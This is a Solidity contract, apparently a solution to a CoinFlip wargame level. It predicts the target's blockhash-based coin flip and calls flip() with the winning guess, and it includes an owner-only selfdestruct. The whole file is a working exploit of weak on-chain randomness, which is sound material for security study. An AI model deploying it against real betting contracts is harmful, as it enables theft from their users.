// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract AttackCoinFlip {
    using SafeMath for uint256;
    address owner;
    address instance;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _instance) {
        instance = _instance;
        owner = msg.sender;
    }
    
    function destroy() public {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }
    
    function attack() public returns (bool) {
        require(msg.sender == owner);
        // Taken from the give CoinFlip contract
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        (bool res, bytes memory data) = instance.call(abi.encodeWithSignature("flip(bool)", side));
        require(res);
        (bool callRet) = abi.decode(data, (bool));
        return callRet;
    }
}